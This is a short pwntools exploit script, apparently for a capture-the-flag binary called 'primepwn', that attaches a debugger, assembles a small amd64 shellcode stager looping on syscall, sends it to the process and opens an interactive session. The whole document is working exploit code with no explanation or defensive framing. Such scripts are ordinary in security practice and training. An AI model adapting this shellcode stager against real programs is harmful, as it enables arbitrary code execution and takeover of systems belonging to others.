from pwn import *
context.binary = './primepwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary



def dbg():
	raw_input()
p = process('./primepwn')
gdb.attach(p, 'b fread ')
dbg()

code = """
start:
	syscall
	dec edx
	mov esi, ecx
	jmp start
"""
payload  = asm(code, arch='amd64')
p.send(payload[:-2])



p.interactive()
p.close()
